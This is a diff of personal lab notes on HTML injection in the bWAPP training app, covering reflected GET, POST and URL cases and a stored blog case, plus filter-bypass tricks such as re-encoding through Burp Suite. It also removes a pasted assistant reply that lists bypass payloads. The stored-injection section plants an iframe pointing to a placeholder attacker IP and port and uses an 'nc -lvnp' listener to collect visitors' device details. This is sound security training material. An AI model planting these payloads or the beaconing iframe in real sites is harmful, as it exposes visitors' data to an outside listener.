@@ -7,7 +7,7 @@ Set the bwapp as low level
 Next try mentionig the Hello in first name and include the HTML code in last name as <b>Hi</b>
 You should be able to see welcome `Hello hi` HI in the last name will appear in BOLD format. 
 
-with this we can confirm that the app has HTML vulnerability where the INPUT sanitization need to be added. (Output encoding - can we add this as a remediation for this and wt is it )
+with this we can confirm that the app has HTML vulnerability where the INPUT sanitization need to be added. 
 Next, change the level to medium 
 Now, you will not be able to use the same format which was used in the low level. If we add <b>Hi</b>, we will see the same text which means input sanitiztion is on. 
 
@@ -15,131 +15,75 @@ Now let's try another method as URL encoding where you can encode the HTML scrip
 Trun on BURP and inspect the proxy. 
 Once you see the request, change the parameters and add the encoded script
 It will not work at first encode. Try re-encoding it and this will help. 
-Now you can see Welcome Hello Hi and HI will be in BOLD format which states that there is still a vulnerability (what is the remediation here and we have done input validation but still hacker is able to use endcoding method so how to get out of it)
+Now you can see Welcome Hello Hi and HI will be in BOLD format which states that there is still a vulnerability 
 
-
-Perfect! Now we’re moving from **reflected GET** to **reflected POST** in bWAPP. The main difference is that your input is sent in the **body of a POST request**, not in the URL. This slightly changes how you test, but the principles of HTML Injection are the same. Let’s go **step by step**, for practice purposes.
-
+HTML INJECTION POST 
 ---
 
-### **Step 1: Understand the POST Flow**
+HTML Injection post method is when we submit the the form and the information is sent to the Server. 
 
-In reflected POST HTML Injection:
+Step 1 
+Set the Severity level as LOW
+Try adding HTML script tag <b>you have been hacked </b> in the last name and Hi in the first name and enter 
+You will see the Hi you have been hacked as reflected. 
+You have been hacked is in BOLD format which shows the web appalication is vulnerable. 
 
-1. There’s a **form** on the page (e.g., a name input or comment box).
-2. When you submit the form, the data is sent **via HTTP POST** to the server.
-3. The server reflects your input back onto the page **without proper sanitization**.
+Step 2 
+Set the severity as medium a
+Try adding HTML script tag as <b>you have been hacked </b> in the last name and Hi in the first name 
+OUTPUT 
+Hi <b> you have been hacked </b>
+Which shows that the app has INPUT VALIDATION 
+Next step is to try encoding the data and input in the parameters using BURPSUITE 
+In the first name and last name use URL encoded data and you will be able to see the HTML code executed.
 
-**Example HTML of a simple vulnerable form:**
 
-```html
-<form method="POST" action="vulnerable.php">
-  Name: <input type="text" name="user">
-  <input type="submit" value="Submit">
-</form>
-```
+Remediation 
+Input validation 
+Output encoding 
+Escaping special characters
 
----
 
-### **Step 2: Select the HTML Injection Bug**
+HTML Injection - Reflected (URL)
+YT - https://www.youtube.com/watch?v=nohSd2U-o-4
+Step 1 
+set the severity to low 
+Now try inserting any data in th URL by adding the placeholders after intercepting the request in Burpsuite
+URL -  http://9.0.0.5/bWAPP/htmli_current_url.php
+URL after the adding the payloads - http://9.0.05/bwapp/htmli_current_url.php?=<h1>reflected_url</h1> 
+Result - 
 
-1. Open bWAPP and log in.
-2. Go to **“Choose your bug”** → select **“HTML Injection (POST)”**.
-3. Choose a difficulty level (start with **low**).
-4. Click **“Hack”** to see the vulnerable form.
+Your current URL: http://9.0.0.5/bWAPP/htmli_current_url.php?=
+reflected_html_url
+reflected_html_url - will be in the Heading format where HTML code has been executed. 
 
----
+Step 2
+set the severity level to medium 
+Now try intercepting the request and use the placeholders and html script in the URL.
+The app will reflect the same as data we have entered without executing the HTML code. 
+This is due to the app have added Input validation in the script where we cannot use the special characters. 
+Lets try using the encoding of URL. 
+use any tool avaible for checking encoding and decoding of the data
+try using burpusite to input the encoded data and still we will not be able to bypass the level 
 
-### **Step 3: Test Basic Injection**
+HTML injection - stored blog
 
-1. In the input box (e.g., Name), type a simple HTML tag like:
+Step 1
+setup the severity to low and try entering any html script and reload the page. 
+example 
+<h1>text</h1>
+we will be able to see the text as heading once we reload the page and it will be stored. 
 
-```html
-<b>Test</b>
-```
+Now check if you can add any advanced scripts 
+<iframe src=<IPADDRESS>:<port> height="00" width ="00"></iframe>
+eneter this command and open the listening port on the terminal 
+nc -lvnp portno 
 
-2. Click **Submit**.
-3. Observe the page: if the text is bold, the input is reflected **without sanitization**, confirming HTML Injection.
+once you reload the page, you will be able to see the device details on the terminal 
+This show that the app is vulnerable due to no proper input sanitzation.
 
----
+Step 2 
+Try the same code as step 1 in the blog field after setting the medium level. 
+This will display the same text which was added without execution. 
+This is due to the XSS_Check function added to the source code.
 
-### **Step 4: Harder Levels**
-
-For “medium” or “hard” POST HTML Injection:
-
-* **Common filters:** may block `<b>`, `<i>`, `<script>`
-* **Bypass methods:**
-
-  1. Use **allowed tags**: `<span>`, `<div>`, `<marquee>`
-  2. Add **inline styles**: e.g., `<span style="color:red">Hello</span>`
-  3. Use **case variations**: `<SPAN>`
-  4. Use **HTML entities** if `<` or `>` are filtered:
-
-     ```html
-     &#60;span&#62;Hello&#60;/span&#62;
-     ```
-
----
-
-### **Step 5: Crafting a POST Payload (Example)**
-
-Suppose the POST input field is `user`. You can test:
-
-```html
-<span style="color:blue">Reflected POST Test</span>
-```
-
-* In **low difficulty**, you can just type it in the form input.
-* In **hard difficulty**, you might need **HTML entity encoding**:
-
-```
-&#60;span style=&#34;color:blue&#34;&#62;Reflected POST Test&#60;/span&#62;
-```
-
-After submission, the page should display the styled content.
-
----
-
-### **Step 6: Using Developer Tools**
-
-For reflected POST testing, using **browser developer tools** or **Burp Suite** is very helpful:
-
-1. Open the form page.
-2. Right-click → **Inspect** → check the input field’s name (e.g., `user`).
-3. Submit the form and watch the **Network tab** to see the POST request.
-4. You can **manually edit the POST data** in the browser or in a proxy to test more complex payloads.
-
----
-
-### **Step 7: Optional Practice Tricks**
-
-* Combine allowed tags with style attributes:
-
-```html
-<span style="color:red; font-size:20px">Hello</span>
-```
-
-* Test `<marquee>` for scrolling text:
-
-```html
-<marquee>Scrolling Text</marquee>
-```
-
-* Try **uppercase tags** or spaces inside the tag to bypass filters:
-
-```html
-<SPAN >Hello</SPAN>
-```
-
----
-
-💡 **Key Difference Between GET and POST Reflection**:
-
-* **GET:** input appears in the URL → can URL encode payload.
-* **POST:** input is in the request body → need to submit via form or proxy, URL encoding optional but still works if filter is simple.
-
----
-
-If you want, I can make a **ready-to-use POST payload table for all bWAPP difficulty levels**, including low, medium, and hard, so you can just practice by copying them into your lab.
-
-Do you want me to do that next?
